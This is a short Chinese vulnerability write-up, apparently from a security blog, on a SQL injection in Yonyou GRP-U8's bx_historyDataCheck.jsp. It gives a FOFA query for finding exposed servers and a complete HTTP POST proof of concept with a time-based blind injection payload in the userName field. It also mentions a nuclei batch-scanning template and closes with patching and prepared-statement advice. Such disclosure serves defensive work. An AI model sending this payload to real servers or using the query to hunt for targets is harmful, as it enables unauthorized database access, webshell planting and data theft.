---
fofa: "app=\"用友-GRP-U8\""
source: "博客园/学安全的小白"
---

# 用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞

# 漏洞描述

用友 GRP-U8 /u8qx/bx_historyDataCheck.jsp 存在 SQL 注入漏洞，攻击者可利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell、执行系统命令以及绕过登录限制等。

# 影响版本

用友 GRP-U8

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 未知 |

# 漏洞复现

FOFA：app="用友-GRP-U8"

POC：

```
POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Connection: close
Content-Length: 67
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

userName=';WAITFOR DELAY '0:0:5'--&ysnd=&historyFlag=
```

响应延迟约 5 秒即确认存在时间盲注。另有公开 nuclei 批量检测模板（id: yonyou_GRPU8_bx_historyDataCheck_sqli，作者 xianke），以响应时长 ≥6 秒且返回包含 GRP-U8 标识作为判定条件。

# 漏洞修复

联系用友官方获取安全补丁，对 userName 等外部输入参数使用预编译语句并做严格过滤。
